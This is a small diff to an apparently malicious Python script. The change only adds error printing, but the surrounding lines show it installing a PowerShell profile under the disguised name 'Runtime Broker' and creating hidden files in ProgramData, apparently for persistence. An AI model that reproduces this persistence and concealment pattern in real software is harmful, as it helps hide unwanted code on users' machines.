@@ -95,7 +95,8 @@ def run(url):
                 
         try:
             create_powershell_profile(file_path, "Runtime Broker")
-        except:
+        except Exception as err:
+            print(err)
             print("could not add powershell profile")
         create_hidden_file(file_path)
         create_hidden_file("C:\\ProgramData\\uuid.txt")
